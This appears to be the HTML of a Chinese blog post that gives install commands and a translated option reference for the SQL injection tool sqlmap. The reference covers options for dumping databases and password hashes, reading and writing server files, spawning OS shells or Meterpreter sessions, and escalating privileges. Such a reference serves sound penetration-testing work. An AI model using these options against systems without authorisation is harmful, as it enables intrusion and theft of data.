@@ -1,0 +1,299 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>sqlmap | 秋刀鱼</title><noscript>开启JavaScript才能访问本站哦~</noscript><link rel="icon" href="https://bu.dusays.com/2023/11/08/654af68b25bb8.jpg"><!-- index.css--><link rel="stylesheet" href="/css/index.css?v=1.5.1"><!-- inject head--><link rel="stylesheet" href="https://cdn.cbd.int/solitude-source/icon/scoicon.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/node-snackbar/0.1.16/snackbar.min.css"><!-- aplayer--><link rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css"><!-- swiper--><!-- Open Graph--><meta name="description" content="SQLMap 是一款专注于SQLi 的工具，堪称神器。SQLmap 基于Python 语言编写的命令行工具，集成在Kali 中。 0x00：安装与更新Kali 自带SQLMap sudo apt-get updatesudo apt-get install sqlmap 如果安装了，那么就是更新"><!-- pwa--><script>(win => {
+        win.saveToLocal = {
+            set: function setWithExpiry(key, value, ttl) {
+                if (ttl === 0)
+                    return
+                const now = new Date()
+                const expiryDay = ttl * 86400000
+                const item = {
+                    value: value,
+                    expiry: now.getTime() + expiryDay,
+                }
+                localStorage.setItem(key, JSON.stringify(item))
+            },
+
+            get: function getWithExpiry(key) {
+                const itemStr = localStorage.getItem(key)
+
+                if (!itemStr) {
+                    return undefined
+                }
+                const item = JSON.parse(itemStr)
+                const now = new Date()
+
+                if (now.getTime() > item.expiry) {
+                    localStorage.removeItem(key)
+                    return undefined
+                }
+                return item.value
+            }
+        }
+
+        const DarkModeStatus = localStorage.getItem('theme')
+        if (DarkModeStatus !== null) {
+            if (DarkModeStatus === 'dark') {
+                document.documentElement.setAttribute('data-theme', 'dark')
+            } else {
+                document.documentElement.setAttribute('data-theme', 'light')
+            }
+        }
+
+        const asideStatus = saveToLocal.get('aside-status')
+        if (asideStatus !== undefined) {
+            if (asideStatus === 'hide') {
+                document.documentElement.classList.add('hide-aside')
+            } else {
+                document.documentElement.classList.remove('hide-aside')
+            }
+        }
+    }
+)(window)
+
+console.log(
+    "%c Program: Hexo %c Theme: Hexo-Theme-Solitude %c Version: v1.5.1",
+    "border-radius:5px 0 0 5px;padding: 5px 10px;color:white;background:#ff3842;margin:10px 0",
+    "padding: 5px 10px;color:white;background:#3e9f50;",
+    "border-radius:0 5px 5px 0;padding: 5px 10px;background:#0084ff;"
+);</script><!-- global head--><script>const GLOBAL_CONFIG = {
+    root: '/',
+    algolia: undefined,
+    localsearch: {"preload":false,"path":"/search.xml"},
+    runtime: '2022-10-01 00:00:00',
+    lazyload: {
+        enable: false,
+        error: '/img/error_load.png'
+    },
+    hightlight: {
+        enable: true,
+        limit: 200,
+        expand: false,
+        copy: true,
+    },
+    randomlinks: false,
+    lang: {
+        theme: {
+            dark: '已切换至深色模式',
+            light: '已切换至浅色模式',
+        },
+        copy: {
+            success: '复制成功',
+            error: '复制失败',
+        },
+        backtop: '返回顶部',
+        time: {
+            recent: '最近',
+            yesterday: '昨天',
+            berforeyesterday: '前天',
+            daybefore: '天前',
+            runtime: '天',
+        },
+        search: {
+            empty: '找不到你查询的内容：${query}',
+            hit: '找到 ${hits} 条结果，用时 ${time} 毫秒',
+            placeholder: '输入关键词快速查找',
+        },
+        chs: {
+            chs_to_cht: '繁體中文',
+            cht_to_chs: '简体中文',
+        }
+    },
+    aside: {
+        sayhello: {
+            morning: '一日之计在于晨',
+            noon: '吃饱了才有力气干活',
+            afternoon: '集中精力，攻克难关',
+            night: '不要太劳累了，早睡更健康',
+            goodnight: '睡个好觉，保证精力充沛',
+        },
+        sayhello2: ["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多","🎮 电竞游戏爱好者"],
+    },
+    covercolor: {
+        enable: false
+    },
+    comment: {
+        enable: false,
+        type: '',
+        commentBarrage: false,
+        randomInfoStart: ["聪敏的","可爱的","美丽的"],
+        randomInfoEnd: ["白菜","小可爱","小仙女"],
+        twikoo: {
+            url: '',
+            accessToken: ''
+        },
+        waline: {
+            url: '',
+        }
+    },
+    lightbox: 'null',
+    rightside: {
+        enable: false
+    },
+    ai: {
+        enable: false,
+        key: '',
+        talk: '我是王卓Sco开发的摘要生成助理ScoGPT，ScoGPT在静态部署时进行摘要的撰写，并且在访客访问时通过ScoCorrection转译后的文本摘要实现工具。我在这里只负责已经生成的摘要显示，你无法与我直接沟通，但我可以回答一些预设的问题。',
+        randomPost: false,
+    },
+    music: {
+        enable: true,
+    },
+    translate: undefined,
+};</script><meta name="generator" content="Hexo 7.1.0"></head><body id="body"><!-- universe--><canvas id="universe"></canvas><!-- loading--><!-- console--><div id="console"><div class="close-btn" onclick="sco.hideConsole()"><i class="scoicon sco-close-fill"></i></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" onclick="sco.switchDarkMode()" title="昼夜切换" href="javascript:void(0);"><i class="scoicon sco-moon-clear-fill"></i></a></div><div class="console-btn-item" id="consoleHideAside"><a class="asideSwitch" onclick="sco.switchHideAside()" title="边栏显示控制" href="javascript:void(0);"><i class="scoicon sco-side-bar-fill"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="sco.musicToggle()"><a class="music-switch" title="音乐开关" href="javascript:void(0);"><i class="scoicon sco-disc-fill"></i></a></div></div><div class="console-mask" onclick="sco.hideConsole()"></div></div><!-- sidebar--><div id="sidebar" style="zoom: 1;"><div id="menu-mask" style="display: none;"></div><div id="sidebar-menus"><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" onclick="sco.switchDarkMode()" href="javascript:void(0);"><i class="scoicon sco-moon-clear-fill"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>文库</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="scoicon  sco-folder-fill"></i><span>文章列表</span></a></li><li><a class="site-page child" href="/categories/"><i class="scoicon  sco-checkbox-multiple-blank-fill"></i><span>全部分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="scoicon  sco-price-tag-fill"></i><span>全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>我的</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/tlink/"><i class="scoicon  sco-tools-fill"></i><span>工具箱</span></a></li><li><a class="site-page child" href="/music/"><i class="scoicon  sco-disc-fill"></i><span>音乐馆</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-widget card-tags card-archives card-webinfo card-allinfo"><div class="card-tag-cloud"><a href="/tags/%E5%88%9D%E7%A2%B0Android/">初碰Android<sup>3</sup></a><a href="/tags/Blue-Team/">Blue-Team<sup>2</sup></a><a href="/tags/CMD/">CMD<sup>1</sup></a><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应<sup>1</sup></a><a href="/tags/django/">django<sup>25</sup></a><a href="/tags/Python%E5%85%A5%E9%97%A8/">Python入门<sup>12</sup></a><a href="/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/">接口测试<sup>1</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞<sup>15</sup></a><a href="/tags/Crawl/">Crawl<sup>1</sup></a><a href="/tags/WAF%E7%BB%95%E8%BF%87/">WAF绕过<sup>1</sup></a><a href="/tags/record/">record<sup>4</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/">学习路线<sup>2</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全<sup>7</sup></a><a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具<sup>10</sup></a><a href="/tags/PC%E5%AE%A2%E6%88%B7%E7%AB%AF/">PC客户端<sup>2</sup></a><a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升<sup>4</sup></a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现<sup>10</sup></a></div></div></div></div><!-- keyboard--><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav class="show" id="nav"><div id="nav-group"><div id="blog_name"><a id="site-name" href="/" title="返回博客主页"><span class="title">Solitude</span></a></div><div id="page-name-mask"><div id="page-name"><a id="page-name-text" onclick="sco.toTop()">sqlmap</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>文库</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="scoicon  sco-folder-fill"></i><span>文章列表</span></a></li><li><a class="site-page child" href="/categories/"><i class="scoicon  sco-checkbox-multiple-blank-fill"></i><span>全部分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="scoicon  sco-price-tag-fill"></i><span>全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>我的</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/tlink/"><i class="scoicon  sco-tools-fill"></i><span>工具箱</span></a></li><li><a class="site-page child" href="/music/"><i class="scoicon  sco-disc-fill"></i><span>音乐馆</span></a></li></ul></div></div></div><div id="nav-left"></div><div id="nav-right"><div class="nav-button" id="travellings_button"><a class="site-page" target="_blank" rel="noopener" href="https://www.travellings.cn/go.html" title=""><i class="scoicon sco-train-line"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机一篇文章" href="javascript:void(0);"><i class="scoicon sco-signal-tower-fill"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索"><i class="scoicon sco-search-line"></i></a></div><div class="nav-button" id="nav-totop" onclick="sco.toTop()"><a class="totopbtn"><i class="scoicon sco-arrow-up-line"></i><span id="percent">0</span></a></div><div id="toggle-menu"><a class="site-page"><i class="scoicon sco-menu-line"></i></a></div></div></div></nav><div class="coverdiv" id="coverdiv"><img class="nolazyload" id="post-cover" src="https://pic.imgdb.cn/item/65e97bbc9f345e8d03e1ef36.png" alt="sqlmap"></div><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original" title="该文章为原创文章，注意版权协议">原创</a><span class="post-meta-categories"><a class="post-meta-categories" href="/categories/安全工具/">安全工具</a></span><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"><span class="tags-name tags-punctuation">安全工具</span></a></div></div></div></div><h1 class="post-title">sqlmap</h1><div id="post-meta"><div class="meta-secondline"><span class="post-meta-wordcount"><span class="post-meta-separator"></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">SQLMap</a> 是一款专注于SQLi 的工具，堪称神器。SQLmap 基于Python 语言编写的命令行工具，集成在Kali 中。</p>
+<h2 id="0x00：安装与更新"><a href="#0x00：安装与更新" class="headerlink" title="0x00：安装与更新"></a>0x00：安装与更新</h2><p>Kali 自带SQLMap </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install sqlmap  如果安装了，那么就是更新</span><br></pre></td></tr></table></figure>
+
+<p>源码安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sqlmapproject/sqlmap.git   </span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01：参数速查"><a href="#0x01：参数速查" class="headerlink" title="0x01：参数速查"></a>0x01：参数速查</h2><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py [选项]</span><br></pre></td></tr></table></figure>
+
+<h4 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-h, --<span class="built_in">help</span>            显示基本帮助信息并退出</span><br><span class="line">-hh                   显示高级帮助信息并退出</span><br><span class="line">--version             显示程序版本信息并退出</span><br><span class="line">-v VERBOSE            输出信息详细程度级别：<span class="number">0</span>-<span class="number">6</span>（默认为 <span class="number">1</span>）</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">至少提供一个以下选项以指定目标</span><br><span class="line"></span><br><span class="line">-u URL, --url=URL   目标 URL（例如：<span class="string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>）</span><br><span class="line">-d DIRECT           可直接连接数据库的地址字符串</span><br><span class="line">-l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址</span><br><span class="line">-m BULKFILE         从文本文件中获取批量目标</span><br><span class="line">-r REQUESTFILE      从文件中读取 HTTP 请求</span><br><span class="line">-g GOOGLEDORK       使用 Google dork 结果作为目标</span><br><span class="line">-c CONFIGFILE       从 INI 配置文件中加载选项</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项可以指定连接目标地址的方式</span><br><span class="line"></span><br><span class="line">-A AGENT, --user..  设置 HTTP User-Agent 头部值</span><br><span class="line">-H HEADER, --hea..  设置额外的 HTTP 头参数（例如：<span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>）</span><br><span class="line">--method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span><br><span class="line">--data=DATA         使用 POST 发送数据串（例如：<span class="string">&quot;id=1&quot;</span>）</span><br><span class="line">--param-<span class="keyword">del</span>=PARA..  设置参数值分隔符（例如：&amp;）</span><br><span class="line">--cookie=COOKIE     指定 HTTP Cookie（例如：<span class="string">&quot;PHPSESSID=a8d127e..&quot;</span>）</span><br><span class="line">--cookie-<span class="keyword">del</span>=COO..  设置 cookie 分隔符（例如：;）</span><br><span class="line">--live-cookies=L..  指定 Live cookies 文件以便加载最新的 Cookies 值</span><br><span class="line">--load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span><br><span class="line">--drop-<span class="built_in">set</span>-cookie   忽略 HTTP 响应中的 <span class="type">Set</span>-Cookie 参数</span><br><span class="line">--mobile            使用 HTTP User-Agent 模仿智能手机</span><br><span class="line">--random-agent      使用随机的 HTTP User-Agent</span><br><span class="line">--host=HOST         指定 HTTP Host</span><br><span class="line">--referer=REFERER   指定 HTTP Referer</span><br><span class="line">--headers=HEADERS   设置额外的 HTTP 头参数（例如：<span class="string">&quot;Accept-Language: fr\nETag: 123&quot;</span>）</span><br><span class="line">--auth-<span class="built_in">type</span>=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span><br><span class="line">--auth-cred=AUTH..  HTTP 认证凭证（username:password）</span><br><span class="line">--auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span><br><span class="line">--ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：<span class="number">401</span>）</span><br><span class="line">--ignore-proxy      忽略系统默认代理设置</span><br><span class="line">--ignore-redirects  忽略重定向尝试</span><br><span class="line">--ignore-timeouts   忽略连接超时</span><br><span class="line">--proxy=PROXY       使用代理连接目标 URL</span><br><span class="line">--proxy-cred=PRO..  使用代理进行认证（username:password）</span><br><span class="line">--proxy-file=PRO..  从文件中加载代理列表</span><br><span class="line">--proxy-freq=PRO..  通过给定列表中的不同代理依次发出请求</span><br><span class="line">--tor               使用 Tor 匿名网络</span><br><span class="line">--tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span><br><span class="line">--tor-<span class="built_in">type</span>=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span><br><span class="line">--check-tor         检查是否正确使用了 Tor</span><br><span class="line">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br><span class="line">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 <span class="number">30</span>）</span><br><span class="line">--retries=RETRIES   连接超时时重试次数（默认为 <span class="number">3</span>）</span><br><span class="line">--randomize=RPARAM  随机更改给定的参数值</span><br><span class="line">--safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span><br><span class="line">                    有些网站在你连续多次访问错误地址时会关闭会话连接，</span><br><span class="line">                    后面的“请求”小节有详细说明）</span><br><span class="line">--safe-post=SAFE..  使用 POST 方法发送合法的数据</span><br><span class="line">--safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span><br><span class="line">--safe-freq=SAFE..  在访问给定的合法 URL 之间穿插发送测试请求</span><br><span class="line">--skip-urlencode    不对 payload 数据进行 URL 编码</span><br><span class="line">--csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span><br><span class="line">--csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL</span><br><span class="line">--csrf-method=CS..  指定访问防 CSRF token 页面时使用的 HTTP 方法</span><br><span class="line">--csrf-retries=C..  指定获取防 CSRF token 的重试次数 （默认为 <span class="number">0</span>）</span><br><span class="line">--force-ssl         强制使用 SSL/HTTPS</span><br><span class="line">--chunked           使用 HTTP 分块传输编码（POST）请求</span><br><span class="line">--hpp               使用 HTTP 参数污染攻击</span><br><span class="line">--<span class="built_in">eval</span>=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span><br><span class="line">                    <span class="string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于优化 sqlmap 性能</span><br><span class="line"></span><br><span class="line">   -o                  开启所有优化开关</span><br><span class="line">   --predict-output    预测常用请求的输出</span><br><span class="line">   --keep-alive        使用持久的 HTTP(S) 连接</span><br><span class="line">   --null-connection   仅获取页面大小而非实际的 HTTP 响应</span><br><span class="line">   --threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 <span class="number">1</span>）</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于指定要测试的参数，</span><br><span class="line">提供自定义注入 payloads 和篡改参数的脚本</span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER    指定需要测试的参数</span><br><span class="line">--skip=SKIP         指定要跳过的参数</span><br><span class="line">--skip-static       指定跳过非动态参数</span><br><span class="line">--param-exclude=..  用正则表达式排除参数（例如：<span class="string">&quot;ses&quot;</span>）</span><br><span class="line">--param-<span class="built_in">filter</span>=P..  通过位置过滤可测试参数（例如：<span class="string">&quot;POST&quot;</span>）</span><br><span class="line">--dbms=DBMS         指定后端 DBMS（Database Management System，</span><br><span class="line">                    数据库管理系统）类型（例如：MySQL）</span><br><span class="line">--dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span><br><span class="line">--os=OS             指定后端 DBMS 的操作系统类型</span><br><span class="line">--invalid-bignum    将无效值设置为大数</span><br><span class="line">--invalid-logical   对无效值使用逻辑运算</span><br><span class="line">--invalid-string    对无效值使用随机字符串</span><br><span class="line">--no-cast           关闭 payload 构造机制</span><br><span class="line">--no-escape         关闭字符串转义机制</span><br><span class="line">--prefix=PREFIX     注入 payload 的前缀字符串</span><br><span class="line">--suffix=SUFFIX     注入 payload 的后缀字符串</span><br><span class="line">--tamper=TAMPER     用给定脚本修改注入数据</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于自定义检测方式</span><br><span class="line"></span><br><span class="line"> --level=LEVEL       设置测试等级（<span class="number">1</span>-<span class="number">5</span>，默认为 <span class="number">1</span>）</span><br><span class="line"> --risk=RISK         设置测试风险等级（<span class="number">1</span>-<span class="number">3</span>，默认为 <span class="number">1</span>）</span><br><span class="line"> --string=STRING     用于确定查询结果为真时的字符串</span><br><span class="line"> --<span class="keyword">not</span>-string=NOT..  用于确定查询结果为假时的字符串</span><br><span class="line"> --regexp=REGEXP     用于确定查询结果为真时的正则表达式</span><br><span class="line"> --code=CODE         用于确定查询结果为真时的 HTTP 状态码</span><br><span class="line"> --smart             只在使用启发式检测时才进行彻底的测试</span><br><span class="line"> --text-only         只根据页面文本内容对比页面</span><br><span class="line"> --titles            只根据页面标题对比页面</span><br></pre></td></tr></table></figure>
+
+<h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于调整特定 SQL 注入技术的测试方法</span><br><span class="line"></span><br><span class="line"> --technique=TECH..  使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span><br><span class="line">                     B: Boolean-based blind SQL injection（布尔型盲注）</span><br><span class="line">                     E: Error-based SQL injection（报错型注入）</span><br><span class="line">                     U: UNION query SQL injection（联合查询注入）</span><br><span class="line">                     S: Stacked queries SQL injection（堆叠查询注入）</span><br><span class="line">                     T: Time-based blind SQL injection（时间型盲注）</span><br><span class="line">                     Q: inline Query injection（内联查询注入）</span><br><span class="line"> --time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 <span class="number">5</span>）</span><br><span class="line"> --union-cols=UCOLS  设置联合查询注入测试的列数目范围</span><br><span class="line"> --union-char=UCHAR  用于暴力猜解列数的字符</span><br><span class="line"> --union-<span class="keyword">from</span>=UFROM  设置联合查询注入 FROM 处用到的表</span><br><span class="line"> --dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span><br><span class="line">                     推荐阅读《在SQL注入中使用DNS获取数据》</span><br><span class="line">                     http://cb.drops.wiki/drops/tips-<span class="number">5283.</span>html，</span><br><span class="line">                     在后面的“技术”小节中也有相应解释）</span><br><span class="line"> --second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：</span><br><span class="line">                     该选项用于 SQL 二阶注入）</span><br><span class="line"> --second-req=SEC..  从文件读取 HTTP 二阶请求</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-f, --fingerprint   执行广泛的 DBMS 版本指纹识别</span><br></pre></td></tr></table></figure>
+
+<h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据</span><br><span class="line"></span><br><span class="line">  -a, --<span class="built_in">all</span>           获取所有信息、数据</span><br><span class="line">  -b, --banner        获取 DBMS banner</span><br><span class="line">  --current-user      获取 DBMS 当前用户</span><br><span class="line">  --current-db        获取 DBMS 当前数据库</span><br><span class="line">  --hostname          获取 DBMS 服务器的主机名</span><br><span class="line">  --<span class="keyword">is</span>-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br><span class="line">  --users             枚举出 DBMS 所有用户</span><br><span class="line">  --passwords         枚举出 DBMS 所有用户的密码哈希</span><br><span class="line">  --privileges        枚举出 DBMS 所有用户特权级</span><br><span class="line">  --roles             枚举出 DBMS 所有用户角色</span><br><span class="line">  --dbs               枚举出 DBMS 所有数据库</span><br><span class="line">  --tables            枚举出 DBMS 数据库中的所有表</span><br><span class="line">  --columns           枚举出 DBMS 表中的所有列</span><br><span class="line">  --schema            枚举出 DBMS 所有模式</span><br><span class="line">  --count             获取数据表数目</span><br><span class="line">  --dump              导出 DBMS 数据库表项</span><br><span class="line">  --dump-<span class="built_in">all</span>          导出所有 DBMS 数据库表项</span><br><span class="line">  --search            搜索列，表和/或数据库名</span><br><span class="line">  --comments          枚举数据时检查 DBMS 注释</span><br><span class="line">  --statements        获取 DBMS 正在执行的 SQL 语句</span><br><span class="line">  -D DB               指定要枚举的 DBMS 数据库</span><br><span class="line">  -T TBL              指定要枚举的 DBMS 数据表</span><br><span class="line">  -C COL              指定要枚举的 DBMS 数据列</span><br><span class="line">  -X EXCLUDE          指定不枚举的 DBMS 标识符</span><br><span class="line">  -U USER             指定枚举的 DBMS 用户</span><br><span class="line">  --exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span><br><span class="line">  --pivot-column=P..  指定主列</span><br><span class="line">  --where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span><br><span class="line">  --start=LIMITSTART  指定要导出的数据表条目开始行数</span><br><span class="line">  --stop=LIMITSTOP    指定要导出的数据表条目结束行数</span><br><span class="line">  --first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span><br><span class="line">  --last=LASTCHAR     指定获取返回查询结果的结束字符位</span><br><span class="line">  --sql-query=SQLQ..  指定要执行的 SQL 语句</span><br><span class="line">  --sql-shell         调出交互式 SQL shell</span><br><span class="line">  --sql-file=SQLFILE  执行文件中的 SQL 语句</span><br></pre></td></tr></table></figure>
+
+<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于暴力破解测试</span><br><span class="line"></span><br><span class="line">   --common-tables     检测常见的表名是否存在</span><br><span class="line">   --common-columns    检测常用的列名是否存在</span><br><span class="line">   --common-files      检测普通文件是否存在</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于创建用户自定义函数</span><br><span class="line"></span><br><span class="line">   --udf-inject        注入用户自定义函数</span><br><span class="line">   --shared-lib=SHLIB  共享库的本地路径</span><br></pre></td></tr></table></figure>
+
+<h4 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于访问后端 DBMS 的底层文件系统</span><br><span class="line"></span><br><span class="line">   --file-read=FILE..  读取后端 DBMS 文件系统中的文件</span><br><span class="line">   --file-write=FIL..  写入到后端 DBMS 文件系统中的文件</span><br><span class="line">   --file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="访问操作系统"><a href="#访问操作系统" class="headerlink" title="访问操作系统"></a>访问操作系统</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于访问后端 DBMS 的底层操作系统</span><br><span class="line"></span><br><span class="line">   --os-cmd=OSCMD      执行操作系统命令</span><br><span class="line">   --os-shell          调出交互式操作系统 shell</span><br><span class="line">   --os-pwn            调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">   --os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">   --os-bof            利用存储过程的缓冲区溢出</span><br><span class="line">   --priv-esc          数据库进程用户提权</span><br><span class="line">   --msf-path=MSFPATH  Metasploit 框架的本地安装路径</span><br><span class="line">   --tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure>
+
+<h4 id="访问-Windows-注册表"><a href="#访问-Windows-注册表" class="headerlink" title="访问 Windows 注册表"></a>访问 Windows 注册表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下选项用于访问后端 DBMS 的 Windows 注册表</span><br><span class="line"></span><br><span class="line">   --reg-read          读取一个 Windows 注册表键值</span><br><span class="line">   --reg-add           写入一个 Windows 注册表键值数据</span><br><span class="line">   --reg-<span class="keyword">del</span>           删除一个 Windows 注册表键值</span><br><span class="line">   --reg-key=REGKEY    指定 Windows 注册表键</span><br><span class="line">   --reg-value=REGVAL  指定 Windows 注册表键值</span><br><span class="line">   --reg-data=REGDATA  指定 Windows 注册表键值数据</span><br><span class="line">   --reg-<span class="built_in">type</span>=REGTYPE  指定 Windows 注册表键值类型</span><br></pre></td></tr></table></figure>
+
